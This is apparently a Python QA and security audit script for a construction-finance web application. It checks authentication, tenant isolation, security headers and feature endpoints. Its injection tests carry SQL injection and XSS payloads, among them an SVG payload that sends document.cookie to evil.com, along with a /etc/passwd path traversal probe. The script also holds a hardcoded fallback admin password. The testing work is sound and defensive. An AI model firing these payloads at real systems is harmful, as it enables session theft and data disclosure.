"""
Finel AI Projects — Full QA + Security Audit v3
Covers: Phases 1-12, all new endpoints, tenant isolation, IDOR, injection, auth bypass.
Run: python backend/tests/run_full_qa_v3.py
Target: http://127.0.0.1:8002 (local) or https://projects.finel.ai (public)
"""
import requests
import json
import time
import os
import sys
import uuid
import random
import string

BASE = os.getenv("TEST_BASE_URL", "http://127.0.0.1:8002")
ADMIN_PW = os.getenv("ADMIN_PASSWORD", "Admin@2026!")
ADMIN_USER = os.getenv("ADMIN_USERNAME", "qa_admin")

PASS = 0; FAIL = 0; WARN = 0
FINDINGS = []

# ── Helpers ───────────────────────────────────────────────────────────────────

def rnd(n=6): return ''.join(random.choices(string.ascii_lowercase, k=n))

def log(status, name, detail=""):
    global PASS, FAIL, WARN
    sym = {"PASS": "+", "FAIL": "X", "WARN": "~"}[status]
    if status == "PASS": PASS += 1
    elif status == "FAIL": FAIL += 1; FINDINGS.append(f"FAIL: {name} — {detail}")
    elif status == "WARN": WARN += 1; FINDINGS.append(f"WARN: {name} — {detail}")
    line = f"  [{sym}] {name}"
    if detail and status != "PASS": line += f"\n       → {detail}"
    print(line)

def check(name, condition, detail="", warn=False):
    log("WARN" if (not condition and warn) else ("PASS" if condition else "FAIL"), name, detail)

def post(url, data, token=None, expected=None, **kw):
    h = {"Authorization": f"Bearer {token}"} if token else {}
    r = requests.post(f"{BASE}{url}", json=data, headers=h, timeout=15, **kw)
    if expected and r.status_code != expected:
        return r, False
    return r, True

def get(url, token=None, expected=200):
    h = {"Authorization": f"Bearer {token}"} if token else {}
    r = requests.get(f"{BASE}{url}", headers=h, timeout=15)
    return r, r.status_code == expected

def put(url, data, token, expected=200):
    h = {"Authorization": f"Bearer {token}"}
    r = requests.put(f"{BASE}{url}", json=data, headers=h, timeout=15)
    return r, r.status_code == expected

def delete(url, token, expected=200):
    h = {"Authorization": f"Bearer {token}"}
    r = requests.delete(f"{BASE}{url}", headers=h, timeout=15)
    return r, r.status_code == expected

def login(username, password):
    r, _ = post("/api/auth/login", {"username": username, "password": password})
    if r.status_code == 200:
        return r.json().get("access_token")
    return None

# ── Rate limiter check ────────────────────────────────────────────────────────
print("=" * 72)
print("  FINEL AI PROJECTS — FULL QA + SECURITY AUDIT v3")
print(f"  Target: {BASE}")
print("=" * 72)
print("\n[Pre-check] Waiting for rate limiter to clear...")
for i in range(30):
    r, _ = post("/api/auth/login", {"username": "probe_v3", "password": "x"})
    if r.status_code == 401: print(f"  Rate limiter clear (attempt {i+1})"); break
    if r.status_code == 429:
        if i == 0: print("  Rate limiter active — waiting up to 2.5 min...")
        time.sleep(5)

# ── Bootstrap: admin login + demo ─────────────────────────────────────────────
admin_tok = login(ADMIN_USER, ADMIN_PW)
if not admin_tok:
    print("FATAL: Cannot login as admin. Check ADMIN_PASSWORD env var.")
    sys.exit(1)

demo_r = requests.post(f"{BASE}/api/auth/demo", timeout=15)
demo_tok = demo_r.json().get("access_token") if demo_r.status_code == 200 else None

# Register two isolated test users
u1 = f"qa_u1_{rnd()}"
u2 = f"qa_u2_{rnd()}"
email1 = f"{u1}@example.com"
email2 = f"{u2}@example.com"
r1, _ = post("/api/auth/register", {"username": u1, "email": email1, "password": "QaTest@2026!"})
r2, _ = post("/api/auth/register", {"username": u2, "email": email2, "password": "QaTest@2026!"})
tok1 = login(u1, "QaTest@2026!") if r1.status_code == 200 else None
tok2 = login(u2, "QaTest@2026!") if r2.status_code == 200 else None

# ═══════════════════════════════════════════════════════════════════════════════
# 1. AUTHENTICATION & SESSION
# ═══════════════════════════════════════════════════════════════════════════════
print("\n── 1. AUTHENTICATION & SESSION ─────────────────────────────────────────")

check("Admin login succeeds", admin_tok is not None)
check("Demo login succeeds", demo_tok is not None)
check("User1 registration succeeds", tok1 is not None)
check("User2 registration isolated", tok2 is not None)

r, _ = post("/api/auth/login", {"username": "admin", "password": "wrongpassword"})
check("Wrong password returns 401", r.status_code == 401)

r, _ = post("/api/auth/login", {"username": "", "password": ""})
check("Empty credentials rejected (4xx)", r.status_code in (400, 401, 422))

r, _ = post("/api/auth/login", {"username": "'; DROP TABLE users; --", "password": "x"})
check("SQL injection in login rejected (4xx)", r.status_code in (400, 401, 422))

r, _ = post("/api/auth/login", {"username": "<script>alert(1)</script>", "password": "x"})
check("XSS payload in login rejected (4xx)", r.status_code in (400, 401, 422))

# JWT manipulation
bad_tok = (admin_tok[:-10] + "AAAAAAAAAA") if admin_tok else "invalid"
r, _ = get("/api/org", token=bad_tok)
check("Tampered JWT rejected (401)", r.status_code == 401)

r, _ = get("/api/org", token="Bearer notajwt")
check("Garbage token rejected (401)", r.status_code == 401)

r, _ = get("/api/invoices")
check("Unauthenticated API rejected (401)", r.status_code == 401)

# Demo session is read-only marker (demo user should not be able to delete admin data)
if demo_tok:
    r, _ = get("/api/org", token=demo_tok)
    check("Demo token accesses its own org", r.status_code == 200)

# Rate limiter: rapid-fire bad logins
print("  [~] Rate limiter test (10 rapid bad logins)...")
statuses = []
for i in range(10):
    r = requests.post(f"{BASE}/api/auth/login", json={"username": f"rl_{i}", "password": "x"}, timeout=5)
    statuses.append(r.status_code)
check("Rate limiter triggers 429 within 10 attempts", 429 in statuses,
      f"Got statuses: {set(statuses)}", warn=True)

proj1_id = None  # initialized here so cleanup section never hits NameError

# ═══════════════════════════════════════════════════════════════════════════════
# 2. TENANT ISOLATION (IDOR)
# ═══════════════════════════════════════════════════════════════════════════════
print("\n── 2. TENANT ISOLATION (IDOR) ──────────────────────────────────────────")

# Create project as user1
if tok1:
    rp, _ = post("/api/projects", {"name": f"QA Project {rnd()}", "province": "ON"}, token=tok1)
    proj1_id = rp.json().get("id") if rp.status_code == 200 else None
    check("User1 can create project", proj1_id is not None)

    if proj1_id and tok2:
        # User2 should NOT be able to read user1's project data
        r, _ = get(f"/api/project/{proj1_id}/qs-reports", token=tok2)
        check("User2 cannot read User1 QS reports (403/404)", r.status_code in (403, 404))

        r, _ = post(f"/api/project/{proj1_id}/qs-reports", {"report_date": "2026-01-01"}, token=tok2)
        check("User2 cannot create in User1 project (403/404)", r.status_code in (403, 404))

        r, _ = get(f"/api/project/{proj1_id}/adjudications", token=tok2)
        check("User2 cannot read User1 adjudications (403/404)", r.status_code in (403, 404))

        r, _ = get(f"/api/project/{proj1_id}/gst-rebates", token=tok2)
        check("User2 cannot read User1 GST rebates (403/404)", r.status_code in (403, 404))

        r, _ = get(f"/api/project/{proj1_id}/mezz-tranches", token=tok2)
        check("User2 cannot read User1 mezz tranches (403/404)", r.status_code in (403, 404))

        r, _ = get(f"/api/project/{proj1_id}/loan-closing-checklist", token=tok2)
        check("User2 cannot read User1 loan closing checklist (403/404)", r.status_code in (403, 404))

    # Horizontal escalation: try accessing arbitrary IDs
    for fake_id in [99999, 0, -1]:
        r, _ = get(f"/api/project/{fake_id}/qs-reports", token=tok1)
        check(f"Project ID {fake_id} returns 404/403", r.status_code in (403, 404))

# Invoice IDOR: admin creates an invoice, user1 tries to access
r_inv = requests.get(f"{BASE}/api/invoices", headers={"Authorization": f"Bearer {admin_tok}"}, timeout=10)
if r_inv.status_code == 200 and r_inv.json().get("items"):
    admin_inv_id = r_inv.json()["items"][0]["id"]
    if tok1:
        r, _ = get(f"/api/invoices/{admin_inv_id}", token=tok1)
        check("User1 cannot read admin invoice (403/404)", r.status_code in (403, 404))

# EFT batch IDOR
if tok1 and tok2:
    rb, _ = post("/api/eft-batches", {"batch_number": f"EFT-QA-{rnd()}", "value_date": "2026-06-01"}, token=tok1)
    if rb.status_code == 200:
        eft_id = rb.json().get("id")
        r, _ = get(f"/api/eft-batches/{eft_id}", token=tok2)
        check("User2 cannot read User1 EFT batch (403/404)", r.status_code in (403, 404))

# API keys IDOR
if tok1:
    rk, _ = post("/api/api-keys", {"name": "QA Key", "scopes": "read"}, token=tok1)
    if rk.status_code == 200:
        key_id = rk.json().get("id")
        if tok2:
            r, _ = delete(f"/api/api-keys/{key_id}", token=tok2)
            check("User2 cannot delete User1 API key (403/404)", r.status_code in (403, 404))

# ═══════════════════════════════════════════════════════════════════════════════
# 3. INPUT VALIDATION & INJECTION
# ═══════════════════════════════════════════════════════════════════════════════
print("\n── 3. INPUT VALIDATION & INJECTION ─────────────────────────────────────")

sql_payloads = [
    "'; DROP TABLE invoices; --",
    "1' OR '1'='1",
    "1; SELECT * FROM users",
    "' UNION SELECT username,password FROM users --",
]
xss_payloads = [
    "<script>alert(document.cookie)</script>",
    '"><img src=x onerror=alert(1)>',
    "javascript:alert(1)",
    "<svg onload=fetch('https://evil.com?c='+document.cookie)>",
]

if tok1:
    for payload in sql_payloads:
        r, _ = post("/api/projects", {"name": payload, "province": "ON"}, token=tok1)
        check(f"SQL injection in project name handled safely", r.status_code in (200, 400, 422),
              f"Payload: {payload[:40]}")

    for payload in xss_payloads:
        r, _ = post("/api/projects", {"name": payload, "description": payload}, token=tok1)
        if r.status_code == 200:
            # Check response doesn't echo unescaped
            resp_text = r.text
            check(f"XSS payload not reflected unescaped in response",
                  "<script>" not in resp_text and "onerror=" not in resp_text,
                  f"Payload echoed: {payload[:40]}")

    # Path traversal
    r, _ = get("/api/project/../../etc/passwd", token=tok1)
    check("Path traversal rejected", r.status_code in (400, 404, 422))

    # Oversized payload
    big = {"name": "x" * 50000, "description": "y" * 50000}
    r, _ = post("/api/projects", big, token=tok1)
    check("Oversized payload handled (no 500)", r.status_code != 500,
          f"Got {r.status_code}")

    # Null byte injection
    r, _ = post("/api/projects", {"name": "test\x00evil", "province": "ON"}, token=tok1)
    check("Null byte in name handled (no 500)", r.status_code != 500)

    # Negative/invalid numeric fields
    r, _ = post("/api/bank-import/match", {"transactions": "not_an_array"}, token=tok1)
    check("Invalid type in bank match returns 4xx/handles gracefully", r.status_code in (400, 422, 500) or r.status_code == 200)

# ═══════════════════════════════════════════════════════════════════════════════
# 4. SECURITY HEADERS
# ═══════════════════════════════════════════════════════════════════════════════
print("\n── 4. SECURITY HEADERS ──────────────────────────────────────────────────")

r = requests.get(f"{BASE}/", timeout=10)
headers = {k.lower(): v for k, v in r.headers.items()}

check("X-Content-Type-Options: nosniff", headers.get("x-content-type-options") == "nosniff")
check("X-Frame-Options: DENY", headers.get("x-frame-options") == "DENY")
check("X-XSS-Protection set", "x-xss-protection" in headers)
check("Content-Security-Policy set", "content-security-policy" in headers)
check("Referrer-Policy set", "referrer-policy" in headers)
check("No Server header leaking version", "server" not in headers or "uvicorn" not in headers.get("server","").lower(), warn=True)
check("No X-Powered-By header", "x-powered-by" not in headers)

# HTTPS redirect (only meaningful on public endpoint)
r_http = requests.get("http://projects.finel.ai/", allow_redirects=False, timeout=10)
check("HTTP redirects to HTTPS (301/302)", r_http.status_code in (301, 302), warn=True)

# ═══════════════════════════════════════════════════════════════════════════════
# 5. PUBLIC ENDPOINT SECURITY
# ═══════════════════════════════════════════════════════════════════════════════
print("\n── 5. PUBLIC ENDPOINT SECURITY ──────────────────────────────────────────")

# Public portals must not expose other orgs' data
public_endpoints = [
    ("/lender/FAKE_TOKEN_12345", "lender"),
    ("/owner/FAKE_TOKEN_12345", "owner"),
    ("/bid/FAKE_TOKEN_12345", "bid"),
    ("/co-approval/FAKE_TOKEN_12345", "co-approval"),
    ("/subcontract/FAKE_TOKEN_12345", "subcontract"),
    ("/proposal/FAKE_TOKEN_12345", "proposal"),
    ("/prequal/FAKE_TOKEN_12345", "prequal"),
]
for ep, name in public_endpoints:
    r = requests.get(f"{BASE}{ep}", timeout=10, allow_redirects=True)
    # These are SPA routes — expect 200 HTML, not 404
    check(f"Public portal /{name}/ accessible (200)", r.status_code == 200,
          f"Got {r.status_code}")

# API versions of public tokens with fake tokens
r = requests.get(f"{BASE}/api/bid/portal/FAKE_TOKEN_99999", timeout=10)
check("Fake bid token returns 404", r.status_code == 404)

r = requests.get(f"{BASE}/api/co-approval/FAKE_TOKEN_99999", timeout=10)
check("Fake CO approval token returns 404", r.status_code == 404)

# Demo endpoint should work without auth
r = requests.post(f"{BASE}/api/auth/demo", timeout=10)
check("Demo endpoint accessible without auth", r.status_code == 200)
check("Demo returns access_token", "access_token" in r.json())

# Tax reference (public, no auth needed)
r = requests.get(f"{BASE}/api/tax/province-reference", timeout=10)
check("Tax reference public endpoint works", r.status_code == 200)
check("Tax reference has 13 provinces", len(r.json()) == 13, f"Got {len(r.json())}")

# FX rates (public)
r = requests.get(f"{BASE}/api/fx/rates", timeout=10)
check("FX rates endpoint works", r.status_code == 200, warn=True)

# Adjudication province rules (public)
r = requests.get(f"{BASE}/api/adjudication/province-rules", timeout=10)
check("Adjudication province rules public endpoint", r.status_code == 200)

# Docs endpoint disabled in production
r = requests.get(f"{BASE}/docs", timeout=10)
check("OpenAPI /docs disabled in prod", r.status_code == 404)
r = requests.get(f"{BASE}/openapi.json", timeout=10)
check("OpenAPI schema disabled in prod", r.status_code == 404)

# ═══════════════════════════════════════════════════════════════════════════════
# 6. PHASE 10 FEATURE QA — LENDER ADVANCED
# ═══════════════════════════════════════════════════════════════════════════════
print("\n── 6. PHASE 10: LENDER ADVANCED ─────────────────────────────────────────")

if tok1 and proj1_id:
    # QS Reports
    r, ok = post(f"/api/project/{proj1_id}/qs-reports", {
        "report_date": "2026-05-01", "qs_firm": "Altus Group",
        "overall_pct_complete": 42.5, "cost_to_complete": 1800000,
        "recommendation": "approve", "schedule_status": "on_track"
    }, token=tok1)
    check("QS report create", ok, r.text[:100])
    qs_id = r.json().get("id") if ok else None

    r, ok = get(f"/api/project/{proj1_id}/qs-reports", token=tok1)
    check("QS report list", ok)
    check("QS report in list", ok and len(r.json()) > 0)

    if qs_id:
        r, ok = put(f"/api/project/{proj1_id}/qs-reports/{qs_id}",
                    {"overall_pct_complete": 55.0, "recommendation": "conditional"}, token=tok1)
        check("QS report update", ok, r.text[:100])
        r, ok = delete(f"/api/project/{proj1_id}/qs-reports/{qs_id}", token=tok1)
        check("QS report delete", ok)

    # Mezz Tranches
    r, ok = post(f"/api/project/{proj1_id}/mezz-tranches", {
        "tranche_name": "Senior CMHC", "tranche_type": "senior",
        "commitment_amount": 5000000, "interest_rate": 5.5, "priority_rank": 1
    }, token=tok1)
    check("Mezz tranche create", ok, r.text[:100])
    mz_id = r.json().get("id") if ok else None

    r, ok = get(f"/api/project/{proj1_id}/mezz-tranches", token=tok1)
    check("Mezz tranche list with summary", ok and "summary" in r.json())

    if mz_id:
        r, ok = put(f"/api/project/{proj1_id}/mezz-tranches/{mz_id}", {"drawn_amount": 500000}, token=tok1)
        check("Mezz tranche update drawn amount", ok)
        r, ok = delete(f"/api/project/{proj1_id}/mezz-tranches/{mz_id}", token=tok1)
        check("Mezz tranche delete", ok)

    # CMHC Take-out
    r, ok = post(f"/api/project/{proj1_id}/takeout-conversion", {
        "program": "CMHC MLI Select", "permanent_lender": "CIBC",
        "permanent_loan_amount": 4500000, "permanent_rate": 4.85,
        "status": "construction"
    }, token=tok1)
    check("CMHC take-out upsert", ok, r.text[:100])
    r, ok = get(f"/api/project/{proj1_id}/takeout-conversion", token=tok1)
    check("CMHC take-out get", ok)

    # Loan Closing Checklist
    r, ok = post(f"/api/project/{proj1_id}/loan-closing-checklist/seed", {}, token=tok1)
    check("Loan closing checklist seed", ok, r.text[:100])
    r, ok = get(f"/api/project/{proj1_id}/loan-closing-checklist", token=tok1)
    check("Loan closing checklist list", ok)
    items = r.json().get("items", []) if ok else []
    check("Loan closing has 40 items", len(items) == 40, f"Got {len(items)}")
    check("Loan closing summary present", "summary" in r.json() if ok else False)

    if items:
        item_id = items[0]["id"]
        r, ok = put(f"/api/project/{proj1_id}/loan-closing-checklist/{item_id}",
                    {"status": "received"}, token=tok1)
        check("Loan closing item status update", ok)

# ═══════════════════════════════════════════════════════════════════════════════
# 7. PHASE 10: ADJUDICATION
# ═══════════════════════════════════════════════════════════════════════════════
print("\n── 7. PHASE 10: ADJUDICATION ────────────────────────────────────────────")

if tok1 and proj1_id:
    r, ok = post(f"/api/project/{proj1_id}/adjudications", {
        "case_number": "ADJ-2026-001",
        "province": "ON",
        "claimant_name": "ABC Concrete Ltd",
        "respondent_name": "GC Corp",
        "disputed_amount": 85000,
        "status": "initiated",
        "adjudicator_appointed_date": "2026-05-01"
    }, token=tok1)
    check("Adjudication create", ok, r.text[:100])
    adj_id = r.json().get("id") if ok else None
    # Should auto-calculate deadline
    if ok:
        deadline = r.json().get("determination_deadline")
        check("Adjudication deadline auto-calculated", deadline is not None, f"Got: {deadline}")
        check("ON deadline is 28 days from appointment", deadline == "2026-05-29" if deadline else False)

    r, ok = get(f"/api/project/{proj1_id}/adjudications", token=tok1)
    check("Adjudication list", ok)

    if adj_id:
        r, ok = put(f"/api/project/{proj1_id}/adjudications/{adj_id}",
                    {"status": "adjudicator_appointed", "adjudicator_name": "J. Smith Q.C."}, token=tok1)
        check("Adjudication status update", ok)

        # Add document
        r, ok = post(f"/api/project/{proj1_id}/adjudications/{adj_id}/documents", {
            "doc_type": "notice", "title": "Notice of Adjudication", "submitted_by": "claimant"
        }, token=tok1)
        check("Adjudication document create", ok)

        r, ok = delete(f"/api/project/{proj1_id}/adjudications/{adj_id}", token=tok1)
        check("Adjudication delete", ok)

    # Province rules reference
    r, ok = get("/api/adjudication/province-rules")
    check("Province rules returns all 13", ok and len(r.json()) == 13)

# ═══════════════════════════════════════════════════════════════════════════════
# 8. PHASE 10: GST/HST REBATES
# ═══════════════════════════════════════════════════════════════════════════════
print("\n── 8. PHASE 10: GST/HST REBATES ─────────────────────────────────────────")

# Calculator (unauthenticated)
r, ok = post("/api/tax/calculate-rebate", {
    "rebate_type": "new_housing", "purchase_price": 400000,
    "gst_paid": 14400, "province": "ON"
})
check("GST rebate calculator (no auth)", ok)
if ok:
    result = r.json()
    check("NHR rebate pct is 36%", result.get("rebate_pct") == 36.0)
    check("NHR estimated rebate > 0", (result.get("estimated_rebate") or 0) > 0)

# Purpose-built rental 100%
r, ok = post("/api/tax/calculate-rebate", {
    "rebate_type": "purpose_built_rental", "province": "ON",
    "gst_paid": 50000, "hst_paid": 0, "is_purpose_built_rental": True
})
check("Purpose-built rental rebate 100%", ok and r.json().get("rebate_pct") == 100.0 if ok else False)

# Above threshold — should be 0 rebate
r, ok = post("/api/tax/calculate-rebate", {
    "rebate_type": "new_housing", "purchase_price": 500000,
    "gst_paid": 25000, "province": "ON"
})
check("NHR above threshold = 0 rebate", ok and r.json().get("estimated_rebate") == 0.0 if ok else False)

if tok1 and proj1_id:
    r, ok = post(f"/api/project/{proj1_id}/gst-rebates", {
        "rebate_type": "new_housing", "province": "ON",
        "applicant_name": "John Smith", "unit_address": "123 Main St",
        "purchase_price": 380000, "gst_paid": 13680
    }, token=tok1)
    check("GST rebate application create", ok, r.text[:100])
    gst_id = r.json().get("id") if ok else None
    if ok:
        check("Estimated rebate auto-computed", (r.json().get("estimated_rebate") or 0) > 0)

    if gst_id:
        r, ok = put(f"/api/project/{proj1_id}/gst-rebates/{gst_id}",
                    {"status": "submitted", "submitted_date": "2026-05-10"}, token=tok1)
        check("GST rebate update", ok)
        r, ok = delete(f"/api/project/{proj1_id}/gst-rebates/{gst_id}", token=tok1)
        check("GST rebate delete", ok)

# ═══════════════════════════════════════════════════════════════════════════════
# 9. PHASE 11: BANK FEED & BANK IMPORT
# ═══════════════════════════════════════════════════════════════════════════════
print("\n── 9. PHASE 11: BANK FEED ───────────────────────────────────────────────")

if tok1:
    # Create bank connection (manual)
    r, ok = post("/api/bank-feed/connections", {
        "institution_name": "TD Canada Trust",
        "account_name": "Operating Chequing",
        "account_type": "chequing",
        "masked_account": "4521",
        "provider": "manual"
    }, token=tok1)
    check("Bank feed connection create", ok, r.text[:100])
    conn_id = r.json().get("id") if ok else None

    r, ok = get("/api/bank-feed/connections", token=tok1)
    check("Bank feed connections list", ok)

    if conn_id:
        # Sync with manual transactions
        txns = [
            {"transaction_date": "2026-05-01", "description": "RONA LEASIDE TORONTO", "amount": -2847.50},
            {"transaction_date": "2026-05-02", "description": "PAYROLL DIRECT DEPOSIT", "amount": 15000.00},
            {"transaction_date": "2026-05-03", "description": "HOME DEPOT PRO 4521", "amount": -1250.00},
            {"transaction_date": "2026-05-04", "description": "CONCRETE READY MIX BARRIE", "amount": -8432.00},
            {"transaction_date": "2026-05-04", "description": "CONCRETE READY MIX BARRIE", "amount": -8432.00},  # duplicate
        ]
        r, ok = post(f"/api/bank-feed/connections/{conn_id}/sync", {"transactions": txns}, token=tok1)
        check("Bank feed sync manual transactions", ok, r.text[:100])
        if ok:
            count = r.json().get("imported", 0)
            check("Duplicate transactions deduplicated", count == 4, f"Got {count} (expected 4, input 5)")

    # Get transactions
    r, ok = get("/api/bank-feed/transactions?status=unmatched&limit=50", token=tok1)
    check("Bank feed transactions list", ok)
    txn_list = r.json().get("transactions", r.json() if isinstance(r.json(), list) else []) if ok else []

    # IDOR: user2 should not see user1 bank transactions
    if tok2:
        r, _ = get("/api/bank-feed/transactions", token=tok2)
        check("User2 cannot see User1 bank transactions", ok and len(r.json().get("transactions", [])) == 0 if r.status_code == 200 else r.status_code in (403, 404))

    if conn_id:
        r, ok = delete(f"/api/bank-feed/connections/{conn_id}", token=tok1)
        check("Bank feed connection delete", ok)

# Bank CSV import parse (with sample CSV)
sample_csv = """Transaction Date,Description 1,Description 2,CAD$,USD$
2026-05-01,RONA HOME & GARDEN,TORONTO ON,2847.50,
2026-05-02,PAYROLL DIRECT,,15000.00,
2026-05-03,HOME DEPOT PRO,4521 TORONTO,-1250.00,
"""
if tok1:
    r = requests.post(
        f"{BASE}/api/bank-import/parse",
        files={"file": ("statement.csv", sample_csv.encode(), "text/csv")},
        headers={"Authorization": f"Bearer {tok1}"},
        timeout=15
    )
    check("Bank CSV parse endpoint", r.status_code == 200, r.text[:100])
    if r.status_code == 200:
        data = r.json()
        check("Bank format detected", data.get("bank_detected") is not None, f"Got: {data.get('bank_detected')}")
        check("Transactions parsed", data.get("transaction_count", 0) > 0)

# ═══════════════════════════════════════════════════════════════════════════════
# 10. PHASE 11: EFT PAYMENTS
# ═══════════════════════════════════════════════════════════════════════════════
print("\n── 10. PHASE 11: EFT PAYMENTS ───────────────────────────────────────────")

if tok1:
    r, ok = post("/api/eft-batches", {
        "batch_number": f"EFT-{rnd()}", "value_date": "2026-05-20",
        "bank_name": "RBC Royal Bank", "originator_id": "FINEL001",
        "payments": [
            {"payee_name": "Rona Inc", "payee_bank_transit": "00123",
             "payee_bank_institution": "003", "payee_bank_account": "123456789",
             "amount": 2847.50, "memo": "INV-2026-089"},
            {"payee_name": "Home Depot Pro", "payee_bank_transit": "00456",
             "payee_bank_institution": "004", "payee_bank_account": "987654321",
             "amount": 1250.00, "memo": "INV-2026-090"},
        ]
    }, token=tok1)
    check("EFT batch create with payments", ok, r.text[:100])
    eft_batch_id = r.json().get("id") if ok else None

    if eft_batch_id:
        check("EFT batch total computed", (r.json().get("total_amount") or 0) == 4097.50)
        check("EFT payment count", r.json().get("payment_count") == 2)

        r, ok = get(f"/api/eft-batches/{eft_batch_id}", token=tok1)
        check("EFT batch get with payments", ok)
        check("EFT batch has payments array", ok and len(r.json().get("payments", [])) == 2)

        # Download CPA-005 file
        r = requests.get(
            f"{BASE}/api/eft-batches/{eft_batch_id}/download",
            headers={"Authorization": f"Bearer {tok1}"},
            timeout=15
        )
        check("EFT CPA-005 file download", r.status_code == 200, r.text[:50])
        if r.status_code == 200:
            content = r.text
            check("CPA-005 has header record (A)", content.startswith("A"))
            check("CPA-005 has credit records (C)", "C" in content)
            check("CPA-005 has trailer record (Z)", "Z" in content)
            check("CPA-005 correct content-type", "text/plain" in r.headers.get("content-type", ""))
            check("CPA-005 filename in header", ".txt" in r.headers.get("content-disposition", ""))

        r, ok = delete(f"/api/eft-batches/{eft_batch_id}", token=tok1)
        check("EFT batch delete (draft)", ok)

# ═══════════════════════════════════════════════════════════════════════════════
# 11. PHASE 11: QB IIF + SAGE 50 EXPORTS
# ═══════════════════════════════════════════════════════════════════════════════
print("\n── 11. PHASE 11: QB DESKTOP + SAGE 50 EXPORTS ───────────────────────────")

if tok1 and proj1_id:
    r = requests.get(f"{BASE}/api/reports/export/qb-iif/{proj1_id}",
                     headers={"Authorization": f"Bearer {tok1}"}, timeout=15)
    check("QB Desktop IIF export", r.status_code == 200, r.text[:50])
    if r.status_code == 200:
        check("IIF has !TRNS header", "!TRNS" in r.text)
        check("IIF content-disposition set", ".iif" in r.headers.get("content-disposition", ""))

    r = requests.get(f"{BASE}/api/reports/export/sage50/{proj1_id}",
                     headers={"Authorization": f"Bearer {tok1}"}, timeout=15)
    check("Sage 50 CA CSV export", r.status_code == 200, r.text[:50])
    if r.status_code == 200:
        check("Sage 50 has Transaction Type header", "Transaction Type" in r.text)
        check("Sage 50 content-disposition set", ".csv" in r.headers.get("content-disposition", ""))

    # IDOR on exports
    if tok2:
        r = requests.get(f"{BASE}/api/reports/export/qb-iif/{proj1_id}",
                         headers={"Authorization": f"Bearer {tok2}"}, timeout=15)
        check("User2 cannot export User1 QB IIF (403/404)", r.status_code in (403, 404))

# ═══════════════════════════════════════════════════════════════════════════════
# 12. PHASE 10: API KEYS & WEBHOOKS
# ═══════════════════════════════════════════════════════════════════════════════
print("\n── 12. PHASE 10: API KEYS & WEBHOOKS ────────────────────────────────────")

if tok1:
    # API Keys
    r, ok = post("/api/api-keys", {"name": "QA Test Key", "scopes": "read"}, token=tok1)
    check("API key create", ok, r.text[:100])
    if ok:
        key_data = r.json()
        check("API key returned with fai_ prefix", key_data.get("key", "").startswith("fai_"))
        check("API key id returned", key_data.get("id") is not None)
        check("Warning message present", "not be shown again" in key_data.get("msg", ""))
        key_id = key_data.get("id")

        r, ok = get("/api/api-keys", token=tok1)
        check("API keys list", ok)
        check("API key in list with prefix only", ok and any(k.get("key_prefix") for k in r.json()))
        check("Full key NOT in list response", ok and not any(k.get("key") for k in r.json()))

        r, ok = put(f"/api/api-keys/{key_id}/toggle", {}, token=tok1)
        check("API key toggle (revoke)", ok)

        r, ok = delete(f"/api/api-keys/{key_id}", token=tok1)
        check("API key delete", ok)

    # Webhooks
    r, ok = post("/api/webhooks", {
        "name": "QA Webhook",
        "url": "https://httpbin.org/post",
        "events": "invoice.created,draw.submitted"
    }, token=tok1)
    check("Webhook create (HTTPS URL)", ok, r.text[:100])
    if ok:
        wh_data = r.json()
        check("Webhook signing secret returned", wh_data.get("signing_secret") is not None)
        check("Signing secret is 64 chars (hex)", len(wh_data.get("signing_secret", "")) == 64)
        wh_id = wh_data.get("id")

        r, ok = get("/api/webhooks", token=tok1)
        check("Webhooks list", ok)
        check("Secret NOT in list response", ok and not any(w.get("secret") for w in r.json()))

        # Test webhook delivery
        r, ok = post(f"/api/webhooks/{wh_id}/test", {}, token=tok1)
        check("Webhook test delivery (network reachable)", ok, r.text[:100] if not ok else "", warn=True)

        r, ok = delete(f"/api/webhooks/{wh_id}", token=tok1)
        check("Webhook delete", ok)

    # HTTP (non-HTTPS) webhook should be rejected
    r, ok = post("/api/webhooks", {"name": "Bad", "url": "http://evil.com/hook", "events": "test"}, token=tok1)
    check("HTTP webhook URL rejected", not ok or r.status_code == 400,
          f"Got {r.status_code}: {r.text[:80]}")

# ═══════════════════════════════════════════════════════════════════════════════
# 13. PHASE 11: FX + STRESS TESTING
# ═══════════════════════════════════════════════════════════════════════════════
print("\n── 13. PHASE 11: FX + STRESS TESTING ───────────────────────────────────")

# FX convert (unauthenticated)
r, ok = post("/api/fx/convert", {"amount": 10000, "from_currency": "USD"})
check("FX convert USD to CAD", ok)
if ok:
    cad = r.json().get("cad_amount", 0)
    rate = r.json().get("rate", 0)
    check("CAD amount > USD amount (rate > 1)", cad > 10000, f"Got CAD {cad}")
    check("Rate is plausible (1.2–1.7)", 1.2 < rate < 1.7, f"Got {rate}", warn=True)

r, ok = post("/api/fx/convert", {"amount": 5000, "from_currency": "CAD"})
check("CAD to CAD = same amount", ok and r.json().get("cad_amount") == 5000.0 if ok else False)

# Stress test
if tok1 and proj1_id:
    r, ok = post(f"/api/project/{proj1_id}/stress-test", {
        "reserve_amount": 2000000,
        "drawn_to_date": 800000,
        "loan_balance": 8000000,
        "interest_rate": 5.5,
        "months_remaining": 18,
        "current_pre_sales_pct": 65.0
    }, token=tok1)
    check("Stress test runs", ok, r.text[:100])
    if ok:
        data = r.json()
        check("Stress test has 6 scenarios", len(data.get("interest_reserve_scenarios", {})) == 6)
        check("Stress test has RAG rating", data.get("rag") in ("green", "amber", "red"))
        check("Stress test has summary text", bool(data.get("summary")))
        check("Pre-sales risk included", "pre_sales_risk" in data)
        check("Base case present", "base_case" in data.get("interest_reserve_scenarios", {}))
        check("Combined worst case present", "combined_worst" in data.get("interest_reserve_scenarios", {}))

# ═══════════════════════════════════════════════════════════════════════════════
# 14. DEMO ROUTE
# ═══════════════════════════════════════════════════════════════════════════════
print("\n── 14. DEMO ROUTE /demo ─────────────────────────────────────────────────")

r = requests.get(f"{BASE}/demo", timeout=10)
check("/demo serves SPA HTML", r.status_code == 200)
check("/demo returns HTML", "text/html" in r.headers.get("content-type", ""))
check("/demo contains Alpine.js app", "x-data=" in r.text or "alpine" in r.text.lower())

# Demo API still works
r = requests.post(f"{BASE}/api/auth/demo", timeout=10)
check("Demo API token valid", r.status_code == 200 and "access_token" in r.json())

# Demo token should not access admin endpoints
if demo_tok:
    r = requests.get(f"{BASE}/api/admin/orgs", headers={"Authorization": f"Bearer {demo_tok}"}, timeout=10)
    check("Demo cannot access admin endpoints", r.status_code in (401, 403, 404))

# ═══════════════════════════════════════════════════════════════════════════════
# 15. MARKETING PAGE
# ═══════════════════════════════════════════════════════════════════════════════
print("\n── 15. MARKETING PAGE ───────────────────────────────────────────────────")

r = requests.get(f"{BASE}/", timeout=10)
